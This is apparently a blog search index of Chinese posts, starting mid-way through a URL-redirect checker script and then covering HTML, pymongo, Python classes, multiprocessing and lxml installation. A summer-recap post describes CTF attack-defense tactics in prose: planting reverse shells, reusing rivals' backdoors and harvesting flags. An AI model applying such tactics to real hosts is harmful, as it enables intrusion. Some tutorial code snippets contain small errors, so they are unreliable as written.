url.startswith(&quot;http&quot;) else &quot;http://{}&quot;.format(url) redirects_url = check_for_redirects(check_url) print(&quot;{}=&gt;{}&quot;.format(check_url,redirects_url)) if name == “main“: all_url = “urls.txt” try: all_url = sys.argv[1] except IndexError: pass urls = (i.strip() for i in open(all_url).readlines()) check_domains(urls) 总结最后在多说两句，脚本就定义了两个简单函数，一个是负责结果的返回，一个是文件读取url，有参考别人的地方，具体过程原理一定搞清楚，不然是无从下手去写的，模仿，自己动手，然后才是自己的风格。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[HTML 20/80关键知识]]></title>
      <url>%2F2016%2F10%2F15%2FHTML-20-80%E5%85%B3%E9%94%AE%E7%9F%A5%E8%AF%86%2F</url>
      <content type="text"><![CDATA[HTML 20/80关键知识1 网页结构 HTML：专注于网页的结构 CSS ：用于修饰网页的样式 Javascript:赋予网页的各种功能（数据存储，通讯，反数据爬取等）2 静态网页的概念拥有HTML和CSS（网页的结构和样式），但没有JavaScript（没有任何数据的传输，比如注册网站或登录后台要传送数据给数据库等） 3 HTML由标签组成，因此是一种标记语言，包含100多种标签，其中最常用的有10中 标签：一般由开始标签+内容+结束标签组成，如： &lt;div&gt; hello,word&lt;/div&gt; 要注意的是，在HTML中，并不是所有的标签都是结束标签 比如img标签： &lt;img src=&quot;images/001.jpg&quot; alt=&quot;蝴蝶兰&quot;&gt; 搭配的标签 用class属性把正确的样式赋予标签，用href属性在标签内引入链接 标签定义列表项目 标签可以用子啊有序列表()和无序列表()中 每个标签带有多个属性，其中有必要属性，如img标签的src属性（值为URL，未定显示图像的URL）和alt属性（值为text，规定显示图像的替代文本） 标签的嵌套 实质是包含关系 内层标签和外层标签是父子关系 同一层标签是兄弟关系 网页设计的结构（要与html结构区别开，这是不同的定义） Header（布置导航，目录） Content(文章，博客） Footer(联系方式等）]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[在python3中操作MongoDB数据库]]></title>
      <url>%2F2016%2F10%2F07%2F%E5%9C%A8python3%E4%B8%AD%E6%93%8D%E4%BD%9CMongoDB%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
      <content type="text"><![CDATA[首先了解一下MongoDB中存储数据的一些概念对于数据路的操作无外乎对表的，集合的操作和对数据的操作。在python中进行下面的所有的操作前，都必须有这几条语句： import pymongo #与mongodb服务器进行连接 client = pymongo.MongoClient(&apos;localhost&apos;, 27017) ceshi = client[&apos;ceshi&apos;] #创建一个名为ceshi的数据库 #若直接连接已有的数据库，类似db = connection[&quot;ganji&quot;] item_info = ceshi[&apos;item_info&apos;]#建名为item_info的集合（表），同建立数据库形式一样 1 _idMongoDB中存储的文档必须有一个”_id”键。这个键的值可以是任何类型的，默认是一个Objectld对象。在一个集合里面，每一个集合都有唯一的”_id”值，来确保集合里面每一个文档都被唯一的标识，如果有两个集合的话，两个集合可以都有一个值为”123”的”_id”的键，但是每一个集合只能有一个”_id”是123的文档。 2 插入、删除、更新记录（文档）（1）对建好的集合中插入数据，用insert(),insert_one()函数 users.insert_one({&quot;url&quot;:item_link})#一般要表前加上数据库的名字 ceshi.users.insert_one({&quot;url&quot;:item_link}) (2)删除集合中的文档，用remove()函数，删除后的文档无法恢复 ceshi.user.remove() 表示删除集合里的所有记录 ceshi.user.remove({&apos;yy&apos;:5}) #表删除yy=5的记录 id = ceshi.users.find_one({&quot;name&quot;:&quot;user1&quot;})[&quot;_id&quot;] ceshi.users.remove(id)#找到name=user1的记录，并根据记录的id删除该记录 （3）更新记录用update()函数 db.collection.update( criteria, objNew, upsert, multi ) criteria: 需要被更新的条件表达式（update的查询条件，类似sql update查询内的where后面的） objNew: 更新表达式（update的对象和一些更新的操作符（如$,$set..）等 upsert: 如目标记录不存在，是否插入新文档（默认为false，不插入） multi: 是否更新多个文档（默认为false，只更新找到的第一条记录，若为ture，就把按条件查出来的多条记录全部更新） ceshi.users.update({&apos;gid&apos;:last_gid, &apos;time&apos;:l_date}, {&apos;$set&apos;:{&apos;gid&apos;:last_gid}, &apos;$set&apos;:{&apos;time&apos;:l_date}, &apos;$addToSet&apos;:{&apos;categories&apos;:category_data}}, upsert=True) #上式表示添加&apos;categories&apos;字段到gid=last_gid,time=l_date的这条记录中。 3 数据的查询（重点）基本上用find()函数进行查询，$lt/$lte/$gt/$gte/$ne，依次等价于&lt; / &lt;= / &gt; / &gt;=/ !=。（l表示less g表示greater e表示equal n表示not ） （1）查询显示符合条件的记录 #查询age小于15的 for u in ceshi.users.find({&quot;age:{&quot;$lt&quot;:15}):print u # 查询 name 等于 user8 的 for u in ceshi.users.find({&quot;name&quot;:&quot;user8&quot;}): print u #获取查询的一个记录（注意用find_one()而不是find()) u2 = ceshi.users.find_one({&quot;name&quot;:&quot;user9&quot;}) # 查不到时返回 None print u2 (2)多条件进行查询 # select * from users where name = &apos;user3&apos; and age &gt; 12 and age &lt; 15 for u in db.users.find({&apos;age&apos;: {&apos;$gt&apos;: 12, &apos;$lt&apos;: 15}, &apos;name&apos;: &apos;user3&apos;}): print u # select * from users where name = &apos;user1&apos; and age = 21 for u in db.users.find({&quot;age&quot;:21, &quot;name&quot;:&quot;user1&quot;}): print u *记住，使用find（）函数时，对应的条件都是以字典的形式表示｛&apos;age&apos;:{&apos;$gt&apos;:12},&apos;xx&apos;:&apos;xx&apos;｝，有多个条件时，都放在一个{}内 （3）计数，用count()函数 # select count(*) from users 查询users表中所有的记录的个数 print(db.users.find().count()) # select count(*) from users where age &gt; 30 查询users表中age&gt;30的记录 print(db.users.find({&quot;age&quot;:{&quot;$gt&quot;:30}}).count()) （4）从第几行开始读取(SLICE)，读取多少行(LIMIT) #从第2行开始读取，读取3行记录 for u in db.users.find().skip(2).limit(3): print u 4 导入json格式数据到Mongodb中 首先运行 mongo shell在数据库中创建一个 collection —— db.createCollection(‘the_name’) 接下来直接在终端/命令行中使用命令导入 json 格式的数据 —— mongoimport -d database_name -c collection_name F:\sample.json 以管理员权限用cd命令进入MongoDB安装目录中bin目录下，运行如下命令：F:MongoDB&gt;bin&gt; mongoimport -d 数据库名字 -c 集合名字 –type 文件类型 –file 文件路径 –upsert其中，–upsert字段的意思是以插入(insert)或者更新(update)的方式来导入数据 F:\MongoDB\bin&gt;mongoimport -d ceshi -c item_infoX --type json --file F:\sample.json --upsert 2016-10-06T14:55:27.643+0800 connected to: localhost 2016-10-06T14:55:30.641+0800 [#####...................] ceshi.item_infoX 7.56MB/34.2MB (22.1%) 2016-10-06T14:55:33.639+0800 [##########..............] ceshi.item_infoX 15.3MB/34.2MB (44.9%) 2016-10-06T14:55:36.639+0800 [################........] ceshi.item_infoX 23.3MB/34.2MB (68.1%) 2016-10-06T14:55:39.640+0800 [#####################...] ceshi.item_infoX 31.3MB/34.2MB (91.5%) 2016-10-06T14:55:40.761+0800 [########################] ceshi.item_infoX 34.2MB/34.2MB (100.0%) 2016-10-06T14:55:40.762+0800 imported 86850 documents 5 未完待续]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[python类的学习]]></title>
      <url>%2F2016%2F10%2F05%2Fpython%E7%B1%BB%E7%9A%84%E5%AD%A6%E4%B9%A0%2F</url>
      <content type="text"><![CDATA[0 前言 正如”类”的名称一样，它描述的概念和我们现实生活中的类的概念很相似。生物有不同的种类，食物有不同的种类，人类社会有种种商品也有不同的种类。单反可被称之为一类的物体，他们都有着相似的特征和行为方式。 也就是说： 类是有一些系列有共同特征和行为事物的抽象概念的综合 1 类的属性，实例属性，方法，引用class CocaCola: #在类里面赋值的变量就是类的变量，类的变量有一个专业术语，称之为类的属性 formula = [&quot;caffeine&quot;,&quot;sugar&quot;,&quot;water&quot;,&quot;soda&quot;] #方法就是函数，但我们把这个函数称之为方法。方法是供实例使用的，因此我们还可以称之为实例方法 #被实例化的对象会被编辑器默默地传入后面的方法括号中，作为第一个参数 &quot;&quot;&quot; #除了必写的self参数之外，__init__()同样可以有自己的参数，同时不需要这样obj.__init__()方法来调用（因为是自动执行） #在实例化的时候往类后面括号中放入参数，相应的所有参数都会传递到这个特殊的__init__()方法中，和函数的参数用法完全相同 def __init__(self,logo_name): #左边的变量作为类的属性，右边是传入的这个参数作为变量，也就是说这个变量的赋值所储存的结果取决于初始化的时候所传进来的参数logo_name,传进来什么那么它就将是什么 self.local_logo = logo_name def drink(self): print (&quot;Energy&quot;) coke = CocaCola(&quot;可口可乐&quot;) #coke.drink() coke.local_logo &quot;&quot;&quot; #和函数一样，类的方法也能有属于自己的函数，我们先试着在.drink()方法上做些改动 def drink(self,how_much): if how_much == &quot;a sip&quot;: print(&quot;Cool~&quot;) elif how_much == &quot;whole bottle&quot;: print (&quot;Headache!&quot;) ice_coke = CocaCola() ice_coke.drink(&quot;a sip&quot;) #类的实例化 按着我们定义好的配方来生产可乐，当然，按照这个配方无论生产多少瓶可乐它们的味道都是一样的 #在左边创建一个变量，右边写上类的名称，看起来很像是赋值的行为，我们称之为类的实例化，而被实例化的对象称之为实例。 coke_for_me = CocaCola() coke_for_you = CocaCola() coke_for_China = CocaCola() #在创建了类之后，通过object.new_attr的形式进行创建一个赋值，于是我们就可以得到一个新的实例的变量，实例的变量称之为实例属性 coke_for_China.local_logo = &quot;可口可乐0&quot; #创建实例属性 print (coke_for_China.local_logo ) #打印实例属性引用结果 #在类的名字后面输入.,IDE就会自动联想出我们之前在定义类的时候写在里面的属性，而这就是类属性的引用 #类的属性会被所有的类的实例共享 print(CocaCola.formula) print(coke_for_me.formula) print(coke_for_you.formula) for element in coke_for_me.formula: print(element) &quot;&quot;&quot; __init__()是initialize(初始化)的缩写，这也就意味着即使我们在创建实例的时候不去引用init_()方法，其中的命令也会先被自动的执行 &quot;&quot;&quot; 2 令人困惑的类属性与实例属性 &quot;&quot;&quot; python中属性的引用机制是自外而内的，当创建一个实例之后，准备开始引用属性，这时编辑器会先搜索该实例是否用拥有该属性，有则引用 如果没有，将搜索这个实例所属的类是否有这个尚需经，如果有，则引用，没有就只能报错 &quot;&quot;&quot; #类属性若被重新赋值，会影响到类属性的引用 class TestA: attr = 1 obj_a = TestA() TestA.attr = 42 print(obj_a.attr) #实例属性若被重新赋值，不会影响到类属性的引用 class TestB: attr =1 obj_a = TestA() obj_b = TestB() obj_a.attr = 42 #实例属性 print(obj_b.attr) #类属性实例属性具有相同的名称，那么.后面引用将会发生什么? class TestC: attr = 1 def __init__(self): self.attr = 42 print(obj_b.attr) print(TestC.__dict__) print(obj_a.__dict__) 运行结果： C:\python35\python3.exe G:/untitled/LeiShuxing.py 42 1 1 {&apos;attr&apos;: 1, &apos;__dict__&apos;: &lt;attribute &apos;__dict__&apos; of &apos;TestC&apos; objects&gt;, &apos;__init__&apos;: &lt;function TestC.__init__ at 0x000001CBBA8DBAE8&gt;, &apos;__module__&apos;: &apos;__main__&apos;, &apos;__doc__&apos;: None, &apos;__weakref__&apos;: &lt;attribute &apos;__weakref__&apos; of &apos;TestC&apos; objects&gt;} {&apos;attr&apos;: 42} 补充也许运行完上面三段代码，会有一些初步结论，但为更直接的解释，全部隐藏在类的特殊属性dict中。dict是一个类的特殊属性，它是一个字典，用于储存类或者实例的属性。即使你不去定义它，他也会存在每一个类中，是默认隐藏的。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[pool线程池的使用]]></title>
      <url>%2F2016%2F09%2F25%2Fpool%E7%BA%BF%E7%A8%8B%E6%B1%A0%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
      <content type="text"><![CDATA[1 线程池的原理和使用问题的提出： 在使用多线程的时候面对着一个问题，如果使用断点下载，把每个range设置为指定值，文件大或者range小都会面对一个任务数爆炸的状态。使用一个线程来完成一个任务会造成线程数过多，线程数过多不仅影响效率，也会影响程序的健壮性 2 线程池的原理1.线程池首先会维护一个任务队列 2.生成工作使用的线程(可以是自定义个数，也可以是系统默认) 3.线程分别从队列中取出任务，并执行，一个任务执行完成需要告诉主线程完成一个任务 4.再从任务队列中取出任务，直到所有任务为空，退出线程 3 具体使用A 新建单一进程import multiprocessing import time def func(msg): print(msg) time.sleep(1) if __name__ == &quot;__main__&quot;: #将函数作为第一个参数传入Process中，注意函数不能是类里面的函数，只能是独立定义的 #把args参数作为第二个参数传入Process中，注意下面例子中的args=(&quot;hello &quot;, )是打包成了元组类型，可迭代，但是里面只有一个元素 #func(&quot;Josn&quot;) p = multiprocessing.Process(target = func,args = (&quot;hello &quot;,)) p.start() p.join() print(&quot;Done!&quot;) B 使用进程池import multiprocessing import time def func(msg): print(msg) time.sleep(1) if __name__ == &quot;__main__&quot;: pool = multiprocessing.Pool() for item in range(3): msg = &quot;hello &quot; + str(item) pool.apply_async(func, (msg,)) pool.close() pool.join()#用来等待进程池中的worker进程完毕，防止主进程在worker进程结束前结束，但pool.join()必须在pool.close()之后 print(&quot;Done!&quot;) 使用 pool.apply_async（）的道理和pool.map()一样，注意的是第二个参数一定是可以迭代的，即函数一个个传进去对应着前面的函数，利用pool.map()创建工程如下 C 利用map函数修改import multiprocessing import time def func(msg) print(msg) time.sleep(2) if __name__ == &quot;__main__&quot;: pool = multiprocessing.Pool() msg_list = [] for item in range(4): msg_list.append(&quot;hello &quot; + str(item)) pool.close() pool.join() print(&quot;Done!&quot;) 总结学会利用pycharm的debug功能下断点，充分领会代码的运行机制]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[python3安装lxml技巧]]></title>
      <url>%2F2016%2F09%2F24%2Fpython3%E5%AE%89%E8%A3%85lxml%E6%8A%80%E5%B7%A7%2F</url>
      <content type="text"><![CDATA[抛出问题python3 安装第三方库报错 Unable to find vcvarsall.bat 出现如下错误：python的部分库在安装时要临时编译，找不到编辑器就会报错，类似的库还有numpy等。根据提示装了Visual C++ 10.0仍然报错。微软网站只找到Python2.7用的VC编辑器（我用的Python3.5)，经过一番挣扎搜索终于解决。 前言lxml是Python语言里和XML以及HTML工作的功能最丰富和最容易使用的库。lxml库的安装和python其他第三方库的安装方法是一样的，但是可能由于一些细节上的失误导致安装失败。我在利用BeautifulSoup模块时，用pip3安装lxml时，各种的报错，但功夫不负有心人，最终利用下面的技巧解决了安装lxml失败问题 技巧1.在系统环境变量中指定pip3.exe的路径 2.安装wheel,Python扩展包pygame地址 http://www.lfd.uci.edu/~gohlke/pythonlibs/#pygame3.点击 pygame-1.9.2b1-cp35-cp35m-win_amd64.whl 4.保存本地文件，文件名结构是很重要的，不要重命名文件。5.wheel（.whl）文件使用PIP3安装。因此，在安装.whl文件之前，需要确保pip3是最新版本。A . pip3是用来解压缩.whl文件的。输入python3 -m ensurepip B . 如果告知Requirement already satisfied，运行升级命令“python –m ensurepip –upgrade” C . 安装 wheel. 在命令提示行输入 “pip3 install wheel”: D . 如果告知Requirement already satisfied，运行升级命令 “pip install wheel –upgrade” E . 现在可以安装pygame-1.9.2b1-cp35-cp35m-win_amd64.whl，确保在保存的文件目录下执行命令，命令行输入“pip install pygame-1.9.2b1-cp35-cp35m-win_amd64.whl” F . “pip3 install lxml” 总结这是我知道安装lxml用到的最切实可行的方法，但每个人遇到的问题不尽相同，利用好谷叔叔，还有在利用pip安装遇到问题，利用好日志文件pip.log中发现问题，定位好问题，搜索然后顺利解答。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[关于python引入模块问题]]></title>
      <url>%2F2016%2F09%2F24%2F%E5%85%B3%E4%BA%8Epython%E5%BC%95%E5%85%A5%E6%A8%A1%E5%9D%97%E9%97%AE%E9%A2%98%2F</url>
      <content type="text"><![CDATA[1. 问题由来关于import和from import使用一直存在疑惑，这几天写爬虫，调用其他的文件，才知道接口可以利用from import实现，具体问题是这样的: from datetime import datetime print(datetime.now()) 就可以执行，但是用import就不行： import datetime print(datetime.now()) 报错：AttributeError: module ‘datetime’ has no attribute ‘now’ import datetime.datetime print(datetime.now()) 报错：ImportError: No module named ‘datetime.datetime’; ‘datetime’ is not a package 2. 具体解释Python标准库中有些东西容易糊弄住我们这些刚刚接触python新手，比如你说的datetime模块，datetime模块中有一个与datetime.py文件同名的类 ，now是它的一个静态方法，可以不用生成实例直接以Class.method()的方式调用。 from module import Something module是一个模块，说白了是一个文件，比如 datetime.py文件。Something是模块的一个具体对象，可以是函数，可以是变量，可以是类。这点接口问题说的很直白。 3. 注意一般情况下尽量使用import a，此时访问B时，可以通过a.B的形式。 有节制的使用from a import B，这样可以直接使用B。 避免使用from a import *，这种方法会污染命名空间，而且不能直观的显示导入哪些对象 4. 知乎完美回答说的清晰明了，233333 你有一个工具箱，箱子里有剪刀，有钳子，有螺丝刀等等。现在你想拧螺丝。然后你一个操作是：从 工具箱 里拿 螺丝刀，然后用 螺丝刀 去拧螺丝 （ from import）。别一个操作是： 拿了 工具箱 ，没打开呢，直接就去 拧螺丝 ( import )。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[暑假总结]]></title>
      <url>%2F2016%2F09%2F03%2F%E6%9A%91%E5%81%87%E6%80%BB%E7%BB%93%2F</url>
      <content type="text"><![CDATA[时光匆匆，匆匆时光，转眼间两个月的暑假就结束了， 回忆暑假有太多需要留念的，又要开始崭新的一学期，崭新的的大三生活，有收获同时也有遗憾，有不足，拼搏是唯一的选择，希望在即将逝去的时光中，一个个小目标都可以实现，进而自己的能力提升。 1.暑假刚刚开始的时候，去焦作参加了iscc2016河南赛区的线下赛，这也是继安恒杯参加的第二次线下赛，比赛中收获了一些经验，但发现了自己很多的不足，需要加强学习的地方太多 day-1 第一天的比赛形式就是线上夺旗赛+选择，选择题就是对自己学习的知识点总结，包括网站安全，路由器配置，linux，病毒等等，如果没有毕师父在助攻，我也不敢说我最后能拿积分多少，自己几斤几两也就清楚了，线上解题拿flag自己暴漏的问题更多，同时也是平时做题的时候出现遗留的问题，稳不住，不能够专注解答一道题，进而不能稳住思路，现在慢慢感觉到解题能力和利用google搜索能力相挂钩，同时对代码的敏捷力，套路的不说，对“静”的学问学习的地方还有很多，只有静稳了，相信自己进步空间还有很多. day-2 结束的第一天晚上，学长们也分享了很多实用的脚本，及使用策略。第二天一开始的时候，也有平台的原因，也有我自己的原因，上来要映射端口，简直日了哈士奇，在浪费了计时流量的情况下，一个多小时竟浪费问题也没有解决掉，那叫一个悲催呀，完全不按前晚预想的套路出牌呀，大约十多才慢慢步入正道，紧接着cherkfile的脚本，造成自己本机文件狂删，黑客？？？只有自己心里清楚，紧接着批量获取flag的时候，策略不行，致使很多的flag失效，在给其他主机留反弹shell时，有的没有访问造成前面的功夫都是无用功，唯一欣慰的时候，最后利用别人的后门，然后利用3.php获取到他人的后门密码，那真叫收割flag收割的手疼。但是在攻击获取靶机的时候，什么中间件啥的完全就是模糊呀，真正的漏洞不会几个，这也是以后在学习实践中努力去培养的。 2. 结束回校没几天，家里有事情回家了一段时间，庆幸和姐，姐夫去青岛耍啦两天，贼开心。第二件大事就是去西安参加了赛客夏令营。在这里收获的不仅仅是知识，是一群志同道合比自己优秀的小伙伴，讲真，跟着老师学的不多，倒是跟着身边比较好的小伙伴学到了很多，不管在安全还是编程方面。期间web讲授的主要是对拿站的敏感点，以及套路，再就是利用sqli搭建的平台对宽字节等等的学习，这也在我回家后的一段时间，尽心的总结了一下，相信也是留给小学弟的干货啦，期间我也自学了总结了很多，比如说ctf技巧，对于ctf常见的弱类型的总结，文件上传，协议的总结性学习，有文档，慢慢都会上传到博客上面，最后一天的CTF比赛，也收获了一些比赛的经验 3. 博客搭建，也废了半天的时间，总体还好有同学的助攻 4. 简言之，知道现在有压力啦，这个暑假也是真正得去学学问啦，废话不多说，在大三关键一年，先定一个小目标，让自己的能力有一个质的跨越，自己的web python编程能力有一个飞跃跨度]]></content>
    </entry>

    
  
  
</search>
